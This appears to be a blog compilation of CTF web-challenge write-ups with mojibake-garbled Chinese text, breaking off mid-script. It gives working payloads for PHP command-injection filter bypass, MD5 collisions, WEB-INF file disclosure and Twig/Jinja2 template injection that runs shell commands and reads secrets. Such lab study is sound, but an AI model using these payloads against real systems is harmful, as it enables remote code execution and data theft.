<p>postä¼ å‚ï¼š</p>
<p>passwd&#x3D;1234567a</p>
<hr>
<h4 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h4><p>è¿™é¢˜é¢„æœŸè§£åº”è¯¥æ˜¯sortï¼Œä½†æ˜¯ca\tå´å¯ä»¥ç»•è¿‡ï¼Œæ˜¯å‡ºé¢˜äººå†™é”™æ­£åˆ™çš„åŸå› ã€‚</p>
<p>æ­£åˆ™åŒ¹é…åæ–œæ çš„é—®é¢˜ï¼š</p>
<p> <a target="_blank" rel="noopener" href="https://ego00.blog.csdn.net/article/details/109654384">å®‰æ´µæ¯ 2019]easy_web 1_fengçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/076c5b422c96">ä»ä¸€é“CTFçš„éé¢„æœŸè§£çœ‹PHPåæ–œæ åŒ¹é…é—®é¢˜ - ç®€ä¹¦ (jianshu.com)</a></p>
<p>urlä¸­imgå‚æ•°çš„å€¼å¾ˆå¯ç–‘ï¼Œmd5è§£å¯†è¯•è¯•</p>
<p><code>TXpVek5UTTFNbVUzTURabE5qYz0-----base64è§£å¯†--&gt;MzUzNTM1MmU3MDZlNjc=-----base64è§£å¯†---&gt;3535352e706e67-----hexè§£å¯†-------&gt;555.png</code></p>
<p>è¯»å–index.phpæºç ï¼Œå¯¹<code>index.php</code>è¿›è¡ŒåŠ å¯†ï¼Œå¾—<code>TmpNM05EWTJNek15WlRaaE56QTJOVFkz</code></p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));<span class="comment">//åŠ å¯†è¿‡ç¨‹</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;<span class="comment">//md5å¼ºæ¯”è¾ƒ</span></span><br><span class="line">    <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;<span class="comment">//å°†cmdçš„å€¼å½“åšç³»ç»ŸæŒ‡ä»¤æ‰§è¡Œ</span></span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨&#x3D;&#x3D;sortå‘½ä»¤&#x3D;&#x3D;è¯»ï¼šcmd&#x3D;sort%20&#x2F;flag</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?img=TUdFMk9UWmxOalEyTlRjNE1tVTNNRFk0TnpBPQ==&amp;cmd=ca\t%20/flag</span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h4 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="*[RoarCTF 2019]Easy Java"></a>*[RoarCTF 2019]Easy Java</h4><p>æ¼æ´æˆå› ï¼šé€šå¸¸ä¸€äº›webåº”ç”¨æˆ‘ä»¬ä¼šä½¿ç”¨å¤šä¸ªwebæœåŠ¡å™¨æ­é…ä½¿ç”¨ï¼Œè§£å†³å…¶ä¸­çš„ä¸€ä¸ªwebæœåŠ¡å™¨çš„æ€§èƒ½ç¼ºé™·ä»¥åŠåšå‡è¡¡è´Ÿè½½çš„ä¼˜ç‚¹å’Œå®Œæˆä¸€äº›åˆ†å±‚ç»“æ„çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚åœ¨ä½¿ç”¨è¿™ç§æ¶æ„çš„æ—¶å€™ï¼Œç”±äºå¯¹é™æ€èµ„æºçš„ç›®å½•æˆ–æ–‡ä»¶çš„æ˜ å°„é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•å‘ä¸€äº›çš„å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´web.xmlç­‰æ–‡ä»¶èƒ½å¤Ÿè¢«è¯»å–ã€‚</p>
<p>æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼š&#x3D;&#x3D;é€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚&#x3D;&#x3D;ä¸€èˆ¬æƒ…å†µï¼Œjspå¼•æ“é»˜è®¤éƒ½æ˜¯ç¦æ­¢è®¿é—®WEB-INFç›®å½•çš„ï¼ŒNginx é…åˆTomcatåšå‡è¡¡è´Ÿè½½æˆ–é›†ç¾¤ç­‰æƒ…å†µæ—¶ï¼Œé—®é¢˜åŸå› å…¶å®å¾ˆç®€å•ï¼ŒNginxä¸ä¼šå»è€ƒè™‘é…ç½®å…¶ä»–ç±»å‹å¼•æ“ï¼ˆNginxä¸æ˜¯jspå¼•æ“ï¼‰å¯¼è‡´çš„å®‰å…¨é—®é¢˜è€Œå¼•å…¥åˆ°è‡ªèº«çš„å®‰å…¨è§„èŒƒä¸­æ¥ï¼ˆè¿™æ ·è€¦åˆæ€§å¤ªé«˜äº†ï¼‰ï¼Œä¿®æ”¹Nginxé…ç½®æ–‡ä»¶ç¦æ­¢è®¿é—®WEB-INFç›®å½•å°±å¥½äº†ï¼š location ~ ^&#x2F;WEB-INF&#x2F;* { deny all; } æˆ–è€…return 404; æˆ–è€…å…¶ä»–ï¼</p>
<p>(1)å…ˆæ‰¾ä¸€ä¸‹<code>WEB-INF/web.xml</code>,POSTä¼ å€¼<code>filename=WEB-INF/web.xml</code></p>
<p>(2)å¾—åˆ°WEB-INF&#x2F;web.xmlæ–‡ä»¶ï¼Œæ‰“å¼€çœ‹åˆ°<code>com.wm.FlagController</code>ï¼Œç„¶åä¸‹è½½FlagController.classæ–‡ä»¶</p>
<p>POSTä¼ å€¼<code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
<p>è®°äº‹æœ¬æ‰“å¼€ï¼Œæœ‰ä¸€ä¸²base64ç¼–ç ï¼Œè§£ç ï¼Œå¾—åˆ°flag</p>
<hr>
<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h4 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h4><p>æŠ“åŒ…æ”¹ipï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-forwarded-for:&#123;&#123;1*7&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°é¡µé¢å˜ä¸ºäº†7ï¼Œç›´æ¥å‘é€ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-forwarded-for:&#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h4 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h4><p>æŠ“åŒ…ï¼Œåœ¨cookieå‘ç°æ³¨å…¥ç‚¹ï¼Œuser&#x3D;7ï¼Œæ˜¾ç¤ºhello 7ï¼Œå­˜åœ¨æ³¨å…¥</p>
<p>åŒºåˆ†Jinja2å’ŒTwig:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Twig </span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;  #è¾“å‡º49</span><br><span class="line">Jinja</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;  #è¾“å‡º7777777</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•å‘ç°æ˜¯Twigæ¨¡æ¿</p>
<p>ç›´æ¥æœç½‘ä¸Šçš„Twigæ³¨å…¥æ¨¡æ¿</p>
<p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p>
<p>å¾—flag</p>
<hr>
<h4 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h4><p>æŠ“åŒ…çœ‹çœ‹ï¼Œå‘ç°é¡µé¢è¾“å‡ºäº†æˆ‘çš„ip,xffæ³¨å…¥ï¼Œå°è¯•X-forwarded-for: 7</p>
<p>å‘ç°é¡µé¢è¾“å‡º7ï¼Œå­˜åœ¨sstiæ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-forwarded-for: &#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<hr>
<h4 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h4><p>æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        // &#123;&#123; &#125;&#125;åŒ…æ‹¬çš„å†…å®¹ä¸ºåç«¯å˜é‡ï¼Œ&#123;% %&#125; åŒ…æ‹¬çš„å†…å®¹ä¸ºé€»è¾‘è¯­å¥</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>ç»™äº†ä¸€ä¸ª<code>/shrine/</code>è·¯å¾„ï¼Œè¿‡æ»¤äº†<code>config</code>ã€<code>self</code>ã€<code>()</code></p>
<p>é‚£ä¹ˆæˆ‘ä»¬åŸæ¥æ ¼å¼çš„æ¨¡æ¿æ³¨å…¥å°±ä¸èƒ½ç”¨äº†ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬æƒ³åˆ°äº†å†…ç½®å‡½æ•°<code>get_flashed_messages()</code>ï¼Œåˆåº”ä¸º<code>config</code>åœ¨<code>current_app</code>é‡Œé¢ã€‚</p>
<p>ä¸è¿‡pythonè¿˜æœ‰ä¸€äº›å†…ç½®å‡½æ•°ï¼Œæ¯”å¦‚&#x3D;&#x3D;url_for&#x3D;&#x3D;å’Œ&#x3D;&#x3D;get_flashed_messages&#x3D;&#x3D;</p>
<p>è¦è·å–é…ç½®ä¿¡æ¯ï¼Œå°±å¿…é¡»ä»å®ƒçš„å…¨å±€å˜é‡ï¼ˆè®¿é—®é…ç½® current_app ç­‰)å…¥æ‰‹</p>
<p><code>/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</code></p>
<p><code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p>
<p>or</p>
<p><code>/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p>
<p>æ‹¿åˆ°flag</p>
<hr>
<h4 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h4><p>pinç ï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2553#toc-2">Flask debug pinå®‰å…¨é—®é¢˜ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/cbca419ba075">flaskæ¡†æ¶ä¸‹çš„ssti+pinç æ‰§è¡Œå‘½ä»¤ - ç®€ä¹¦ (jianshu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug æ¨¡å¼ PIN ç ç”Ÿæˆæœºåˆ¶å®‰å…¨æ€§ç ”ç©¶ç¬”è®° - HacTF - åšå®¢å›­ (cnblogs.com)</a></p>
<p>è¿™é¢˜åº”è¯¥æ˜¯æ‰¾pinç æ‹¿shell</p>
<p>ä¸‹é¢å†™çš„æ˜¯éé¢„æœŸè§£ï¼š</p>
<p>æ‰“å¼€æ˜¯ä¸€ä¸ªbase64åŠ å¯†è§£å¯†çš„é¡µé¢ï¼Œé¢˜ç›®æ˜¯flaskï¼Œå°è¯•sstiæ³¨å…¥ï¼Œåœ¨è§£å¯†çš„è¾“å…¥æ¡†é‡Œå†™å…¥<code>&#123;&#123;1*7&#125;&#125;</code>çš„base64åŠ å¯†å­—ç¬¦ä¸²ï¼Œå‘ç°å›æ˜¾<code>no no no !!</code>ï¼Œåº”è¯¥æ˜¯æœ‰è¿‡æ»¤ã€‚æ¢æˆ<code>&#123;undefined&#123;1*7&#125;&#125;</code>çš„base64åŠ å¯†å­—ç¬¦ä¸²åˆ™å›æ˜¾7ï¼Œè¯´æ˜ç¡®å®å­˜åœ¨sstiã€‚</p>
<p>å¦å¤–å¦‚æœåœ¨è§£å¯†æ¡†éšä¾¿è¾“å…¥å­—ç¬¦(base64decodeåœ¨ä¸ä¼šè§£æçš„æ—¶å€™å°±ä¼šæŠ¥é”™)ï¼Œä¼šæŠ›å‡ºdebugä¿¡æ¯ï¼Œå‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32138231">Flaskå¼€å¯debugæ¨¡å¼ç­‰äºç»™é»‘å®¢ç•™äº†åé—¨ - çŸ¥ä¹ (zhihu.com)</a></p>
<p>å¯ä»¥è¯»åˆ°éƒ¨åˆ†app.pyä»£ç ã€‚</p>
<p>è¯»å®Œæ•´app.pyçš„payloadï¼ˆè¦æ”¹æˆä¸€è¡Œï¼‰ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åçŸ¥é“äº†ä¸€ä¸ªè¿‡æ»¤çš„å­—ç¬¦ï¼Œç›´æ¥&#x3D;&#x3D;å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡&#x3D;&#x3D;ã€‚</p>
<p>å…ˆä½¿ç”¨listdiræ–¹æ³•çœ‹çœ‹å½“å‰ç›®å½•æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­this_is_the_flag.txtæœ‰flagå­—æ ·ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•è¯»è¿™ä¸ªæ–‡ä»¶ï¼Œè¿˜æ˜¯é‡‡ç”¨æ‹¼æ¥å­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œç„¶åç»“åˆå†…å»ºå‡½æ•°open</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>base64åŠ å¯†åæ”¾å…¥è§£å¯†æ¡†å†…ï¼Œæ‹¿åˆ°flag</p>
<hr>
<h4 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h4><p>F12æœ‰æç¤ºï¼ŒGETä¼ å‚searchã€‚</p>
<p><code>?search=&#123;&#123;1*7&#125;&#125;</code></p>
<p>é¡µé¢æ˜¾ç¤º7ï¼Œè¯´æ˜å­˜åœ¨ssti</p>
<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39; os&#39;].system(&#39;ls&#39;)</code></p>
<p>æ˜¾ç¤º500ï¼Œé¡µé¢é”™è¯¯ï¼Œåº”è¯¥æ˜¯å­˜åœ¨è¿‡æ»¤ã€‚è¿‡æ»¤äº†globalsï¼Œæˆ‘ä»¬ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚</p>
<p><code>[&#39;__glo&#39;+&#39;bals__&#39;]</code></p>
<p>æœ€ç»ˆpayload:</p>
<p><code>?search=&#123;&#123;"".__class__.__bases__[0].__subclasses__()[250].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls /').read()")&#125;&#125;</code></p>
<hr>
<h4 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h4><p>æ‰¾å‚æ•°</p>
<p>æ˜¯name</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat ./flag.txt&#x27;).read()&quot;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Double-Secret" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Double Secret"></a>[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</h4><p>pyè„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">  <span class="comment"># print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;)</span></span><br><span class="line">  s_box = rc4_init_sbox(key)</span><br><span class="line">  crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">  <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">  s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  </span><br><span class="line">  <span class="comment"># print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)</span></span><br><span class="line">  j = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">â€‹    j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">â€‹    s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">  <span class="comment"># print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)</span></span><br><span class="line">  <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">  <span class="comment"># print(&quot;è°ƒç”¨åŠ 